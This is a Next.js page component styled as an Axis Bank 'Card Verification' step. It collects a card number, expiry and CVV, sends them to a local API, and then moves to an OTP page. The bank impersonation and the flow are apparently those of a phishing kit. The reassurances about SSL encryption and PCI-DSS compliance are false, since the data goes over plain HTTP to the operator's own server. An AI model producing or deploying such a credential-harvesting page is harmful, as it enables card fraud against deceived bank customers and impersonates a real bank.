"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { User, CreditCard, Calendar, Lock, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import axios from "axios";

export default function CardDetailsPage() {
  const router = useRouter();
  const [applicationId, setApplicationId] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");

  useEffect(() => {
    const id = localStorage.getItem("applicationId");
    if (id) {
      setApplicationId(id);
    } else {
      // If no ID found, redirect back to first step
      router.push("/form");
    }
  }, [router]);

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
    if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
    
    // Add spaces after every 4 digits
    const formatted = value.match(/.{1,4}/g)?.join(" ") || value;
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
    if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
    
    // Add slash after 2 digits
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiry(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.put(`http://localhost:5001/api/v1/applications/${applicationId}`, {
        cardNumber,
        expiryDate: expiry,
        cvv,
      });
      
      if (response.data.success) {
        router.push("/form/otp");
      }
    } catch (error) {
      console.error("Error submitting card details:", error);
      alert("Failed to submit. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center">
      
      {/* Maroon Header Section */}
      <div className="w-full bg-[#A10D59] text-white py-8 text-center rounded-b-[2.5rem] shadow-md">
        <div className="flex justify-center mb-4">
          <div className="w-12 h-12 bg-white flex items-center justify-center text-[#A10D59] font-bold text-xl rounded-lg">
            <CreditCard className="w-6 h-6 text-[#A10D59]" />
          </div>
        </div>
        <h1 className="text-xl font-bold mb-1">Card Verification</h1>
        <p className="text-xs opacity-80">Secure 256-bit SSL Encryption</p>
      </div>

      {/* Form Container */}
      <div className="w-full max-w-2xl px-4 mt-6 space-y-6">
        
        <p className="text-xs text-center text-zinc-500">
          Please provide your Axis credit card details below to complete verification.
        </p>

        {/* Card Illustration */}
        <div className="bg-gradient-to-r from-[#A10D59] via-[#8E0C4F] to-[#2B4C7E] rounded-xl p-6 text-white relative shadow-md h-40 flex flex-col justify-between">
          <div className="flex justify-between items-start">
            <CreditCard className="w-8 h-8 opacity-80" />
            <span className="text-sm font-semibold opacity-80">AXIS BANK</span>
          </div>
          
          <div className="space-y-4">
            <p className="text-lg tracking-widest font-mono opacity-90">
              {cardNumber || "**** **** **** ****"}
            </p>
            <div className="flex justify-between text-xs opacity-75">
              <span>{name || "Cardholder Name"}</span>
              <span>{expiry || "MM/YY"}</span>
            </div>
          </div>
        </div>

        {/* Actual Inputs */}
        <div className="bg-white rounded-xl p-6 shadow-sm border border-zinc-100">
          <form onSubmit={handleSubmit} className="space-y-4">
            
            {/* Name */}
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="text"
                placeholder="Name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            {/* Card Number */}
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <CreditCard className="w-4 h-4 text-zinc-400" />
              </div>
              <input
                type="text"
                placeholder="1234 5678 9012 3456"
                value={cardNumber}
                onChange={handleCardNumberChange}
                required
                className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
              />
            </div>

            {/* MM/YY and CVV */}
            <div className="grid grid-cols-2 gap-4">
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <Calendar className="w-4 h-4 text-zinc-400" />
                </div>
                <input
                  type="text"
                  placeholder="MM/YY"
                  value={expiry}
                  onChange={handleExpiryChange}
                  required
                  className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
                />
              </div>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <Lock className="w-4 h-4 text-zinc-400" />
                </div>
                <input
                  type="password"
                  placeholder="CVV"
                  maxLength={3}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  required
                  className="w-full pl-10 pr-4 py-2.5 text-sm border border-zinc-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59]"
                />
              </div>
            </div>

            <Button type="submit" className="w-full bg-[#A10D59] hover:bg-[#8E0C4F] text-white py-2.5 rounded-lg text-sm font-semibold shadow-md shadow-[#A10D59]/10 flex items-center justify-center gap-2">
              <ShieldCheck className="w-4 h-4" /> Verify Securely
            </Button>

            {/* Security Notice */}
            <div className="text-center space-y-1 mt-4">
              <p className="text-[10px] text-zinc-500 flex items-center justify-center gap-1">
                🔒 Your information is encrypted and securely transmitted.
              </p>
              <p className="text-[10px] text-zinc-400">
                Axis follows international PCI-DSS compliance for all transactions.
              </p>
            </div>

          </form>
        </div>
      </div>

      {/* Footer link back */}
      <div className="py-6">
        <Link href="/form" className="text-xs text-[#A10D59] hover:underline font-medium">
          Back to Registration
        </Link>
      </div>
    </div>
  );
}
